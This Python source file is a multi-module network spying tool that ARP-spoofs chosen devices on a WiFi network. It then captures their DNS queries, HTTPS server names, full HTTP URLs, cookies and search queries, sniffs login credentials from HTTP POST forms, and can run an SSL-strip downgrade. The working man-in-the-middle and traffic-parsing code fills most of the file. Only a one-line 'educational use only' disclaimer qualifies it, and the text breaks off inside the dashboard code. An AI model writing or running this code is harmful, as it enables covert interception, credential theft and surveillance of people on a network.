#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║   🕵️  NetVision Device Spy v3 — Full Intelligence Suite (16 Modules)║
║                                                                      ║
║   1.  📡 Deep Packet Capture (DNS, HTTPS SNI, HTTP URLs, headers)    ║
║   2.  📱 Device Fingerprinting (OS, browser, phone model, vendor)    ║
║   3.  🚨 Real-Time Alerts (adult, banking, hacking, downloads)       ║
║   4.  🔑 Credential Sniffer (HTTP POST login forms)                  ║
║   5.  📁 File Download Tracker (PDFs, APKs, videos, images)          ║
║   6.  🖼️  Image Capture (HTTP image URLs)                             ║
║   7.  💬 Chat App Detector (WhatsApp, Telegram, Discord, etc)        ║
║   8.  🕐 Browsing Timeline (chronological per-device history)        ║
║   9.  ⛔ Network Control (kick, throttle, block sites)               ║
║   10. 🌐 Web Dashboard + Interactive Map (localhost:8080)            ║
║   11. 📲 Telegram Push Notifications (critical alerts)               ║
║   12. 🔐 SSL Strip (HTTPS → HTTP downgrade)                          ║
║   13. 📊 Session Recording (.pcap + HTML report)                     ║
║   14. 🛡️  Deauth Monitor (detect ARP spoofing attacks)               ║
║   15. 📡 IoT Discovery (mDNS/SSDP — Chromecast, Alexa, etc)         ║
║   16. 🧠 AI Browsing Analysis (behavioral profiling + anomalies)     ║
║                                                                      ║
║   Usage:                                                             ║
║     sudo python3 device_spy.py                    # Interactive      ║
║     sudo python3 device_spy.py -t 192.168.1.105   # Target device   ║
║     sudo python3 device_spy.py --all               # Spy on ALL     ║
║     sudo python3 device_spy.py --all --web         # + Web UI        ║
║     sudo python3 device_spy.py --all --sslstrip    # + SSL Strip     ║
║     sudo python3 device_spy.py --all --telegram TOKEN CHAT_ID       ║
║                                                                      ║
║   ⚠️  EDUCATIONAL USE ONLY — Your own network only!                  ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import signal
import argparse
import threading
import time
import re
import json
import socket
from datetime import datetime
from collections import defaultdict, deque

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, ICMP, Raw,
        send, sendp, srp, sniff, get_if_hwaddr, conf, wrpcap, Packet
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("ERROR: scapy is required. Install: pip install scapy")
    sys.exit(1)

try:
    from rich.console import Console, Group
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.live import Live
    from rich.box import HEAVY, ROUNDED, SIMPLE, MINIMAL
    from rich.rule import Rule
    from rich.prompt import Prompt, IntPrompt
    from rich import box
except ImportError:
    print("ERROR: rich is required. Install: pip install rich")
    sys.exit(1)

from scanner import NetworkScanner
from speed_monitor import SpeedMonitor
from geo_mapper import GeoMapper
from device_fingerprint import DeviceFingerprinter
from alert_system import AlertSystem
from interceptors import CredentialSniffer, FileTracker, ImageCapture, ChatDetector, SessionTimeline
from network_control import NetworkController
from web_dashboard import WebDashboard
from sslstrip import SSLStripper
from session_recorder import SessionRecorder
from advanced_modules import DeauthMonitor, DeviceDiscovery, BrowsingAnalyzer
from deep_app_intel import DeepAppIntel
from wifi_blocker import WiFiBlocker
from bluetooth_scanner import BluetoothScanner


class PacketLog:
    """Stores details of a single captured packet."""

    def __init__(self, timestamp, src_ip, dst_ip, src_port, dst_port,
                 protocol, size, domain=None, url=None, method=None,
                 user_agent=None, referer=None, search_query=None,
                 dns_type=None, raw_info=None):
        self.timestamp = timestamp
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.src_port = src_port
        self.dst_port = dst_port
        self.protocol = protocol
        self.size = size
        self.domain = domain
        self.url = url
        self.method = method
        self.user_agent = user_agent
        self.referer = referer
        self.search_query = search_query
        self.dns_type = dns_type
        self.raw_info = raw_info

    def to_dict(self):
        return {
            "time": self.timestamp.strftime("%H:%M:%S.%f")[:-3],
            "src": f"{self.src_ip}:{self.src_port}" if self.src_port else self.src_ip,
            "dst": f"{self.dst_ip}:{self.dst_port}" if self.dst_port else self.dst_ip,
            "proto": self.protocol,
            "size": self.size,
            "domain": self.domain,
            "url": self.url,
            "method": self.method,
            "user_agent": self.user_agent,
            "referer": self.referer,
            "search_query": self.search_query,
        }


class DeviceSpy:
    """
    Full packet capture spy for a specific device on the WiFi network.
    Uses ARP spoofing to intercept ALL their traffic.
    """

    def __init__(self, interface, gateway_ip, local_ip, target_ips,
                 telegram_token=None, telegram_chat_id=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.local_ip = local_ip
        self.target_ips = target_ips  # List of IPs to spy on

        self.gateway_mac = None
        self.local_mac = None
        self.target_macs = {}       # IP -> MAC

        self._running = False
        self._lock = threading.Lock()

        # Captured packets (per target)
        self._packets = defaultdict(lambda: deque(maxlen=2000))
        self._all_packets = deque(maxlen=5000)

        # DNS log per device
        self._dns_log = defaultdict(lambda: deque(maxlen=500))

        # Websites visited per device
        self._websites = defaultdict(lambda: defaultdict(int))

        # Full URLs captured
        self._urls = defaultdict(lambda: deque(maxlen=500))

        # Search queries per device
        self._searches = defaultdict(lambda: deque(maxlen=200))

        # Connections per device: (dst_ip, dst_port, proto) -> count
        self._connections = defaultdict(lambda: defaultdict(int))

        # Bandwidth per device
        self._bandwidth = defaultdict(lambda: {"in": 0, "out": 0, "total": 0})

        # User agents per device
        self._user_agents = defaultdict(set)

        # Stats
        self._stats = {
            "total_packets": 0,
            "dns_packets": 0,
            "http_packets": 0,
            "https_packets": 0,
            "tcp_packets": 0,
            "udp_packets": 0,
            "other_packets": 0,
            "total_bytes": 0,
            "arp_sent": 0,
            "start_time": None,
        }

        # Log file
        self._log_file = None
        self._log_entries = []

        # ═══ NEW MODULES ═══
        self.fingerprinter = DeviceFingerprinter()
        self.alerts = AlertSystem(
            telegram_token=telegram_token,
            telegram_chat_id=telegram_chat_id,
        )
        self.credential_sniffer = CredentialSniffer()
        self.file_tracker = FileTracker()
        self.image_capture = ImageCapture()
        self.chat_detector = ChatDetector()
        self.timeline = SessionTimeline()
        self.geo_mapper = GeoMapper()
        self.controller = NetworkController(interface, gateway_ip, local_ip)

        # ═══ ADVANCED MODULES ═══
        self.sslstrip = SSLStripper(interface, local_ip)
        self.recorder = SessionRecorder(interface=interface)
        self.deauth_monitor = DeauthMonitor(interface, gateway_ip)
        self.device_discovery = DeviceDiscovery()
        self.analyzer = BrowsingAnalyzer()
        self.app_intel = DeepAppIntel()
        self.wifi_blocker = WiFiBlocker(interface, gateway_ip)
        self.bt_scanner = BluetoothScanner()

        # Search patterns
        self._search_patterns = {
            "google": re.compile(r"[?&]q=([^&]+)"),
            "bing": re.compile(r"[?&]q=([^&]+)"),
            "yahoo": re.compile(r"[?&]p=([^&]+)"),
            "duckduckgo": re.compile(r"[?&]q=([^&]+)"),
            "youtube": re.compile(r"[?&]search_query=([^&]+)"),
            "amazon": re.compile(r"[?&]k=([^&]+)"),
        }

        # Noise filter
        self._noise = {
            "arpa", "local", "localhost", "_tcp", "_udp", "mdns",
            "connectivity-check", "connectivitycheck",
            "msftconnecttest", "msftncsi",
            "gstatic.com", "googleapis.com",
            "push.apple.com", "icloud-content.com",
            "app-measurement", "firebaseio",
            "safebrowsing", "ocsp.", "crl.", "pki.",
        }

    # ═══════════════════════════════════════════════════════════════════
    # SETUP
    # ═══════════════════════════════════════════════════════════════════

    def setup(self, console):
        """Setup ARP spoofing prerequisites."""
        conf.verb = 0

        # Get our MAC
        try:
            self.local_mac = get_if_hwaddr(self.interface)
        except Exception:
            result = os.popen(f"ip link show {self.interface}").read()
            match = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", result)
            self.local_mac = match.group(1) if match else "00:00:00:00:00:00"

        console.print(f"  [bright_green]✓[/] Our MAC: [bold]{self.local_mac}[/]")

        # Get gateway MAC
        self.gateway_mac = self._resolve_mac(self.gateway_ip)
        if not self.gateway_mac:
            console.print(f"  [bright_red]✗[/] Cannot resolve gateway MAC!")
            return False
        console.print(f"  [bright_green]✓[/] Gateway MAC: [bold]{self.gateway_mac}[/]")

        # Resolve target MACs
        for ip in self.target_ips:
            mac = self._resolve_mac(ip)
            if mac:
                self.target_macs[ip] = mac
                console.print(f"  [bright_green]✓[/] Target {ip} → [bold]{mac}[/]")
            else:
                console.print(f"  [bright_yellow]⚠[/] Cannot resolve {ip} — will retry")

        # Enable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            console.print(f"  [bright_green]✓[/] IP Forwarding: [bold]ENABLED[/]")
        except PermissionError:
            os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

        # Setup log file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        targets_str = "_".join([ip.replace(".", "-") for ip in self.target_ips[:3]])
        self._log_file = os.path.join(
            os.path.dirname(__file__),
            f"spy_log_{targets_str}_{timestamp}.json"
        )
        console.print(f"  [bright_green]✓[/] Log file: [bold]{self._log_file}[/]")

        return True

    def _resolve_mac(self, ip):
        """Resolve IP to MAC via ARP."""
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(pkt, timeout=3, verbose=False, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass

        # Fallback: ARP table
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip and parts[3] != "00:00:00:00:00:00":
                        return parts[3]
        except Exception:
            pass

        return None

    # ═══════════════════════════════════════════════════════════════════
    # ARP SPOOFING
    # ═══════════════════════════════════════════════════════════════════

    def _arp_spoof_loop(self):
        """Continuously ARP spoof targets."""
        while self._running:
            for target_ip in self.target_ips:
                target_mac = self.target_macs.get(target_ip)
                if not target_mac:
                    # Try to resolve again
                    target_mac = self._resolve_mac(target_ip)
                    if target_mac:
                        self.target_macs[target_ip] = target_mac

                if target_mac:
                    try:
                        # Tell target: we are the gateway
                        pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
                        send(pkt1, verbose=False, iface=self.interface)

                        # Tell gateway: we are the target
                        pkt2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip)
                        send(pkt2, verbose=False, iface=self.interface)

                        self._stats["arp_sent"] += 2
                    except Exception:
                        pass

            time.sleep(1.5)

    def _restore_arp(self):
        """Restore real ARP entries."""
        for target_ip in self.target_ips:
            target_mac = self.target_macs.get(target_ip)
            if target_mac and self.gateway_mac:
                try:
                    # Restore target's ARP: gateway is really gateway_mac
                    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                               psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                    send(pkt1, count=5, verbose=False, iface=self.interface)

                    # Restore gateway's ARP: target is really target_mac
                    pkt2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                               psrc=target_ip, hwsrc=target_mac)
                    send(pkt2, count=5, verbose=False, iface=self.interface)
                except Exception:
                    pass

    # ═══════════════════════════════════════════════════════════════════
    # PACKET SNIFFING
    # ═══════════════════════════════════════════════════════════════════

    def _sniff_loop(self):
        """Capture packets from target devices."""
        try:
            sniff(
                iface=self.interface,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda p: not self._running,
            )
        except Exception:
            pass

    def _process_packet(self, packet):
        """Deep packet inspection on every captured packet."""
        try:
            if not packet.haslayer(IP):
                return

            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            pkt_size = len(packet)

            # Only process packets to/from our targets
            is_target_src = src_ip in self.target_ips
            is_target_dst = dst_ip in self.target_ips

            if not is_target_src and not is_target_dst:
                return

            # Skip our own management traffic
            if src_ip == self.local_ip and dst_ip in self.target_ips:
                return
            if dst_ip == self.local_ip and src_ip in self.target_ips:
                return

            # Determine the target device
            device_ip = src_ip if is_target_src else dst_ip
            direction = "OUT" if is_target_src else "IN"

            self._stats["total_packets"] += 1
            self._stats["total_bytes"] += pkt_size

            # ═══ PCAP RECORDING ═══
            self.recorder.write_packet(packet)

            # ═══ mDNS DISCOVERY ═══
            if packet.haslayer(UDP) and packet[UDP].dport == 5353:
                self.device_discovery.process_mdns_packet(packet)

            with self._lock:
                self._bandwidth[device_ip]["total"] += pkt_size
                if direction == "OUT":
                    self._bandwidth[device_ip]["out"] += pkt_size
                else:
                    self._bandwidth[device_ip]["in"] += pkt_size

            # ─── DNS ─────────────────────────────────────
            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                self._process_dns(packet, device_ip, src_ip, dst_ip, pkt_size)
                return

            # ─── TCP ─────────────────────────────────────
            if packet.haslayer(TCP):
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                self._stats["tcp_packets"] += 1

                # Only process outbound from target
                if is_target_src:
                    # HTTPS (TLS Client Hello)
                    if dst_port == 443:
                        self._process_tls(packet, device_ip, src_ip, dst_ip, src_port, dst_port, pkt_size)

                    # HTTP
                    elif dst_port in (80, 8080, 8443):
                        self._process_http(packet, device_ip, src_ip, dst_ip, src_port, dst_port, pkt_size)

                    # Other TCP
                    else:
                        self._log_connection(device_ip, dst_ip, dst_port, "TCP", pkt_size)

                return

            # ─── UDP ─────────────────────────────────────
            if packet.haslayer(UDP):
                self._stats["udp_packets"] += 1
                src_port = packet[UDP].sport if is_target_src else 0
                dst_port = packet[UDP].dport if is_target_src else 0

                if is_target_src and dst_port not in (53, 5353, 1900):
                    self._log_connection(device_ip, dst_ip, dst_port, "UDP", pkt_size)

                # Deep App Intel — track UDP streams (calls, QUIC)
                udp_domain = self._resolve_ip_to_domain(dst_ip)
                self.app_intel.process_packet(
                    device_ip, domain=udp_domain, dst_ip=dst_ip,
                    dst_port=dst_port if is_target_src else src_port,
                    pkt_size=pkt_size,
                    direction="OUT" if is_target_src else "IN",
                    proto="UDP",
                )
                return

            # ─── Other ───────────────────────────────────
            self._stats["other_packets"] += 1

        except Exception:
            pass

    def _process_dns(self, packet, device_ip, src_ip, dst_ip, pkt_size):
        """Capture DNS queries — what domains the target is looking up."""
        try:
            query = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")

            if not query or len(query) < 3:
                return

            # Filter noise
            q_lower = query.lower()
            for noise in self._noise:
                if noise in q_lower:
                    return
            if "arpa" in q_lower or "in-addr" in q_lower:
                return

            qtype = "A"
            try:
                qt = packet[DNSQR].qtype
                qtypes = {1: "A", 28: "AAAA", 5: "CNAME", 15: "MX", 16: "TXT", 2: "NS", 33: "SRV"}
                qtype = qtypes.get(qt, str(qt))
            except Exception:
                pass

            # DNS response IPs
            resolved_ips = []
            if packet.haslayer(DNSRR):
                try:
                    for i in range(packet[DNS].ancount):
                        rr = packet[DNSRR][i] if hasattr(packet[DNSRR], '__getitem__') else packet[DNSRR]
                        if hasattr(rr, 'rdata'):
                            resolved_ips.append(str(rr.rdata))
                except Exception:
                    pass

            self._stats["dns_packets"] += 1

            log_entry = PacketLog(
                timestamp=datetime.now(),
                src_ip=src_ip, dst_ip=dst_ip,
                src_port=None, dst_port=53,
                protocol="DNS", size=pkt_size,
                domain=query, dns_type=qtype,
                raw_info=f"DNS {qtype} {query}" + (f" → {','.join(resolved_ips[:3])}" if resolved_ips else ""),
            )

            with self._lock:
                self._dns_log[device_ip].append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "domain": query,
                    "type": qtype,
                    "resolved": resolved_ips[:3],
                })
                self._websites[device_ip][query] += 1
                self._packets[device_ip].append(log_entry)
                self._all_packets.append(log_entry)

            # ═══ MODULE HOOKS ═══
            self.timeline.add_event(device_ip, "DNS", f"Looked up {query}", domain=query)
            self.chat_detector.check(device_ip, domain=query)
            self.alerts.check(device_ip, domain=query)
            self.analyzer.feed_activity(device_ip, query)
            self.recorder.log_event("DNS", f"Resolved {query}", device_ip=device_ip, domain=query)
            self.app_intel.process_packet(
                device_ip, domain=query, dst_ip=dst_ip,
                pkt_size=pkt_size, direction="OUT", proto="UDP",
            )

        except Exception:
            pass

    def _process_tls(self, packet, device_ip, src_ip, dst_ip, src_port, dst_port, pkt_size):
        """Capture TLS Client Hello — extract SNI (server name)."""
        try:
            self._stats["https_packets"] += 1
            sni = None

            if packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)

                # TLS Client Hello: content_type=0x16, handshake_type=0x01
                if len(payload) > 5 and payload[0] == 0x16 and payload[5] == 0x01:
                    sni = self._extract_sni(payload)

            if sni:
                q_lower = sni.lower()
                for noise in self._noise:
                    if noise in q_lower:
                        return

                url = f"https://{sni}/"

                log_entry = PacketLog(
                    timestamp=datetime.now(),
                    src_ip=src_ip, dst_ip=dst_ip,
                    src_port=src_port, dst_port=dst_port,
                    protocol="HTTPS", size=pkt_size,
                    domain=sni, url=url,
                    raw_info=f"TLS ClientHello → {sni}",
                )

                with self._lock:
                    self._websites[device_ip][sni] += 1
                    self._urls[device_ip].append({
                        "time": datetime.now().strftime("%H:%M:%S"),
                        "url": url,
                        "domain": sni,
                        "type": "HTTPS",
                        "dst_ip": dst_ip,
                    })
                    self._connections[device_ip][(dst_ip, 443, "HTTPS")] += 1
                    self._packets[device_ip].append(log_entry)
                    self._all_packets.append(log_entry)

                # ═══ MODULE HOOKS ═══
                self.timeline.add_event(device_ip, "HTTPS", f"Visited {sni}",
                                       domain=sni, url=url)
                self.chat_detector.check(device_ip, domain=sni, dst_ip=dst_ip, dst_port=443)
                self.alerts.check(device_ip, domain=sni, url=url)
                self.geo_mapper.lookup(dst_ip)
                self.analyzer.feed_activity(device_ip, sni, url=url)
                self.recorder.log_event("HTTPS", f"Visit {sni}", device_ip=device_ip, domain=sni, url=url)
                self.app_intel.process_packet(
                    device_ip, domain=sni, dst_ip=dst_ip, dst_port=443,
                    pkt_size=pkt_size, direction="OUT", proto="TCP",
                )
            else:
                # Non-ClientHello TLS packet — still log the connection
                self._log_connection(device_ip, dst_ip, dst_port, "TLS", pkt_size)

        except Exception:
            pass

    def _process_http(self, packet, device_ip, src_ip, dst_ip, src_port, dst_port, pkt_size):
        """Capture HTTP requests — full URLs, headers, search queries."""
        try:
            self._stats["http_packets"] += 1

            if not packet.haslayer(Raw):
                self._log_connection(device_ip, dst_ip, dst_port, "HTTP", pkt_size)
                return

            payload = bytes(packet[Raw].load).decode("utf-8", errors="ignore")

            # Request line
            req_match = re.search(r"(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\S+)\s+HTTP", payload)
            if not req_match:
                self._log_connection(device_ip, dst_ip, dst_port, "HTTP", pkt_size)
                return

            method = req_match.group(1)
            path = req_match.group(2)

            # Host
            host_match = re.search(r"Host:\s*([^\r\n]+)", payload, re.IGNORECASE)
            host = host_match.group(1).strip() if host_match else dst_ip

            # Filter noise
            h_lower = host.lower()
            for noise in self._noise:
                if noise in h_lower:
                    return

            full_url = f"http://{host}{path}"

            # User-Agent
            ua_match = re.search(r"User-Agent:\s*([^\r\n]+)", payload, re.IGNORECASE)
            user_agent = ua_match.group(1).strip() if ua_match else None

            # Referer
            ref_match = re.search(r"Referer:\s*([^\r\n]+)", payload, re.IGNORECASE)
            referer = ref_match.group(1).strip() if ref_match else None

            # Content-Type
            ct_match = re.search(r"Content-Type:\s*([^\r\n]+)", payload, re.IGNORECASE)
            content_type = ct_match.group(1).strip() if ct_match else None

            # Cookie
            cookie_match = re.search(r"Cookie:\s*([^\r\n]+)", payload, re.IGNORECASE)
            has_cookie = bool(cookie_match)

            # Search query
            search_query = self._extract_search(host, path)

            log_entry = PacketLog(
                timestamp=datetime.now(),
                src_ip=src_ip, dst_ip=dst_ip,
                src_port=src_port, dst_port=dst_port,
                protocol="HTTP", size=pkt_size,
                domain=host, url=full_url,
                method=method, user_agent=user_agent,
                referer=referer, search_query=search_query,
                raw_info=f"{method} {full_url}" + (f" [UA: {user_agent[:30]}]" if user_agent else ""),
            )

            with self._lock:
                self._websites[device_ip][host] += 1
                self._urls[device_ip].append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "url": full_url,
                    "domain": host,
                    "type": "HTTP",
                    "method": method,
                    "referer": referer,
                    "user_agent": user_agent,
                    "has_cookie": has_cookie,
                    "dst_ip": dst_ip,
                })
                self._connections[device_ip][(dst_ip, dst_port, "HTTP")] += 1
                self._packets[device_ip].append(log_entry)
                self._all_packets.append(log_entry)

                if user_agent:
                    self._user_agents[device_ip].add(user_agent[:100])

                if search_query:
                    self._searches[device_ip].append({
                        "time": datetime.now().strftime("%H:%M:%S"),
                        "query": search_query,
                        "engine": host,
                    })

            # ═══ MODULE HOOKS ═══
            # Device fingerprinting from User-Agent
            if user_agent:
                mac = self.target_macs.get(device_ip, "")
                self.fingerprinter.fingerprint_from_ua(device_ip, user_agent, mac=mac)

            # Credential sniffing (HTTP POST forms)
            if method == "POST":
                self.credential_sniffer.analyze_http_payload(
                    device_ip, host, method, path, payload, pkt_size
                )

            # File download tracking
            self.file_tracker.check_url(
                device_ip, full_url, host=host,
                content_type=content_type or "",
            )

            # Image capture
            self.image_capture.check_url(
                device_ip, full_url, host=host, referer=referer or ""
            )

            # Chat detection
            self.chat_detector.check(device_ip, domain=host, dst_ip=dst_ip, dst_port=dst_port, url=full_url)

            # Timeline
            desc = f"{method} {full_url[:60]}"
            if search_query:
                desc = f'Searched: "{search_query}"'
                self.timeline.add_event(device_ip, "SEARCH", desc, domain=host, url=full_url)
            else:
                self.timeline.add_event(device_ip, "HTTP", desc, domain=host, url=full_url)

            # Alerts
            self.alerts.check(device_ip, domain=host, url=full_url, search_query=search_query or "")

            # Geo resolve
            self.geo_mapper.lookup(dst_ip)

            # AI Analysis
            self.analyzer.feed_activity(device_ip, host, url=full_url, search_query=search_query or "")

            # Session recording
            self.recorder.log_event(
                "HTTP", f"{method} {host}{path[:30]}",
                device_ip=device_ip, domain=host, url=full_url,
            )

            # Deep App Intel
            self.app_intel.process_packet(
                device_ip, domain=host, dst_ip=dst_ip, dst_port=dst_port,
                pkt_size=pkt_size, direction="OUT", proto="TCP",
                url=full_url, content_type=content_type or "",
            )

        except Exception:
            pass

    def _log_connection(self, device_ip, dst_ip, dst_port, proto, pkt_size):
        """Log a generic connection."""
        with self._lock:
            self._connections[device_ip][(dst_ip, dst_port, proto)] += 1

    def _extract_sni(self, payload):
        """Extract SNI from TLS Client Hello payload."""
        try:
            idx = 43
            if idx >= len(payload):
                return None
            session_len = payload[idx]
            idx += 1 + session_len

            if idx + 2 > len(payload):
                return None
            cipher_len = int.from_bytes(payload[idx:idx+2], 'big')
            idx += 2 + cipher_len

            if idx >= len(payload):
                return None
            comp_len = payload[idx]
            idx += 1 + comp_len

            if idx + 2 > len(payload):
                return None
            ext_len = int.from_bytes(payload[idx:idx+2], 'big')
            idx += 2
            ext_end = min(idx + ext_len, len(payload))

            while idx + 4 < ext_end:
                etype = int.from_bytes(payload[idx:idx+2], 'big')
                elen = int.from_bytes(payload[idx+2:idx+4], 'big')
                idx += 4

                if etype == 0:  # SNI
                    if idx + 5 <= len(payload):
                        nlen = int.from_bytes(payload[idx+3:idx+5], 'big')
                        if idx + 5 + nlen <= len(payload):
                            return payload[idx+5:idx+5+nlen].decode('ascii', errors='ignore')
                idx += elen
        except Exception:
            pass
        return None

    def _extract_search(self, host, path):
        """Extract search query from URL."""
        try:
            url = f"http://{host}{path}"
            for engine, pattern in self._search_patterns.items():
                if engine in host.lower():
                    match = pattern.search(url)
                    if match:
                        from urllib.parse import unquote_plus
                        return unquote_plus(match.group(1))

            generic = re.compile(r"[?&](?:q|query|search|keyword|s)=([^&]+)")
            match = generic.search(path)
            if match:
                from urllib.parse import unquote_plus
                return unquote_plus(match.group(1))
        except Exception:
            pass
        return None

    # ═══════════════════════════════════════════════════════════════════
    # START / STOP
    # ═══════════════════════════════════════════════════════════════════

    def start(self, enable_sslstrip=False, enable_pcap=True):
        """Start spying."""
        self._running = True
        self._stats["start_time"] = datetime.now()

        # ARP spoof thread
        threading.Thread(target=self._arp_spoof_loop, daemon=True).start()
        # Sniffer thread
        threading.Thread(target=self._sniff_loop, daemon=True).start()
        # Auto-save log every 30s
        threading.Thread(target=self._auto_save_loop, daemon=True).start()

        # Start advanced modules
        self.deauth_monitor.start()
        self.device_discovery.start()

        # Session recording (PCAP)
        if enable_pcap:
            pcap_file = self.recorder.start(target_ips=self.target_ips)

        # SSL Strip
        if enable_sslstrip:
            self.sslstrip.start()

        # Bluetooth scanner
        self.bt_scanner.start()

    def stop(self):
        """Stop spying and restore network."""
        self._running = False
        self._restore_arp()
        self._save_log()

        # Disable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except Exception:
            pass

    def _auto_save_loop(self):
        """Periodically save captured data to log file."""
        while self._running:
            time.sleep(30)
            self._save_log()

    def _save_log(self):
        """Save captured data to JSON log file."""
        try:
            data = {
                "timestamp": datetime.now().isoformat(),
                "targets": self.target_ips,
                "interface": self.interface,
                "stats": {
                    "total_packets": self._stats["total_packets"],
                    "total_bytes": self._stats["total_bytes"],
                    "dns": self._stats["dns_packets"],
                    "http": self._stats["http_packets"],
                    "https": self._stats["https_packets"],
                },
                "devices": {},
            }

            with self._lock:
                for ip in self.target_ips:
                    sites = dict(self._websites.get(ip, {}))
                    sorted_sites = sorted(sites.items(), key=lambda x: x[1], reverse=True)

                    data["devices"][ip] = {
                        "bandwidth": dict(self._bandwidth.get(ip, {})),
                        "dns_queries": list(self._dns_log.get(ip, [])),
                        "top_sites": sorted_sites[:50],
                        "urls": list(self._urls.get(ip, []))[-100:],
                        "searches": list(self._searches.get(ip, [])),
                        "user_agents": list(self._user_agents.get(ip, set())),
                        "connections": [
                            {"dst": f"{k[0]}:{k[1]}", "proto": k[2], "count": v}
                            for k, v in sorted(
                                self._connections.get(ip, {}).items(),
                                key=lambda x: x[1], reverse=True
                            )[:50]
                        ],
                    }

            with open(self._log_file, "w") as f:
                json.dump(data, f, indent=2, default=str)

        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════
    # PUBLIC API
    # ═══════════════════════════════════════════════════════════════════

    def get_stats(self):
        return dict(self._stats)

    def get_dns_log(self, ip, limit=30):
        with self._lock:
            return list(self._dns_log.get(ip, []))[-limit:]

    def get_websites(self, ip, limit=20):
        with self._lock:
            sites = dict(self._websites.get(ip, {}))
            return sorted(sites.items(), key=lambda x: x[1], reverse=True)[:limit]

    def get_urls(self, ip, limit=30):
        with self._lock:
            return list(self._urls.get(ip, []))[-limit:]

    def get_searches(self, ip, limit=20):
        with self._lock:
            return list(self._searches.get(ip, []))[-limit:]

    def get_connections(self, ip, limit=20):
        with self._lock:
            conns = self._connections.get(ip, {})
            return sorted(conns.items(), key=lambda x: x[1], reverse=True)[:limit]

    def get_bandwidth(self, ip):
        with self._lock:
            return dict(self._bandwidth.get(ip, {"in": 0, "out": 0, "total": 0}))

    def get_user_agents(self, ip):
        with self._lock:
            return list(self._user_agents.get(ip, set()))

    def get_all_recent(self, limit=30):
        with self._lock:
            return [p.to_dict() for p in list(self._all_packets)[-limit:]]

    def _resolve_ip_to_domain(self, ip):
        """Reverse-resolve an IP to a domain from our DNS log cache."""
        try:
            for device_ip, entries in self._dns_log.items():
                for entry in reversed(list(entries)):
                    resolved = entry.get("resolved", [])
                    if ip in resolved:
                        return entry.get("domain", "")
        except Exception:
            pass
        return ""


# ═══════════════════════════════════════════════════════════════════════
# DASHBOARD
# ═══════════════════════════════════════════════════════════════════════

class SpyDashboard:
    """Rich terminal dashboard for the device spy with all modules."""

    def __init__(self, spy, scanner):
        self.spy = spy
        self.scanner = scanner
        self.console = Console(highlight=False)
        self._running = True
        self._view = "main"  # main, alerts, timeline, control

    def _get_device_name(self, ip):
        """Look up a friendly device name from scanner + fingerprinter."""
        name_parts = []
        vendor_part = ""

        # 1. Try fingerprinter first (has brand/model from User-Agent)
        profile = self.spy.fingerprinter.get_profile(ip)
        if profile:
            brand = getattr(profile, 'device_brand', '') or ''
            model = getattr(profile, 'device_model', '') or ''
            if brand or model:
                name_parts.append(f"{brand} {model}".strip())

        # 2. Try scanner device info (hostname, vendor from MAC)
        for device in self.scanner.get_devices():
            if device.ip == ip:
                if device.hostname and device.hostname != "Unknown":
                    if not name_parts:  # Only use hostname if no fingerprint
                        name_parts.insert(0, device.hostname)
                    elif device.hostname not in str(name_parts):
                        name_parts.insert(0, device.hostname)
                if device.vendor and device.vendor != "Unknown Vendor":
                    vendor_part = device.vendor
                # Always show MAC prefix if nothing else
                if not name_parts and not vendor_part:
                    return device.mac[:8]
                break

        # Build final name
        if name_parts:
            result = name_parts[0]
            if vendor_part and vendor_part not in result:
                result += f" ({vendor_part})"
            return result
        elif vendor_part:
            return vendor_part
        return ip  # Final fallback

    def run(self):
        signal.signal(signal.SIGINT, self._handle_exit)

        with Live(self._render(), console=self.console, refresh_per_second=1, screen=True) as live:
            while self._running:
                try:
                    live.update(self._render())
                    time.sleep(1)
                except KeyboardInterrupt:
                    self._running = False
                    break
                except Exception:
                    time.sleep(1)

    def _handle_exit(self, sig, frame):
        self._running = False

    def _render(self):
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=3),
        )
        layout["header"].update(self._header())
        layout["footer"].update(self._footer())

        layout["body"].split_row(
            Layout(name="left", ratio=3),
            Layout(name="right", ratio=2),
        )

        layout["left"].split_column(
            Layout(name="packets", ratio=3),
            Layout(name="dns", ratio=1),
            Layout(name="alerts_mini", ratio=1),
        )

        layout["right"].split_column(
            Layout(name="app_intel", ratio=2),
            Layout(name="device_info", ratio=1),
            Layout(name="sites", ratio=1),
            Layout(name="connections", ratio=1),
        )

        layout["packets"].update(self._packet_feed())
        layout["dns"].update(self._dns_panel())
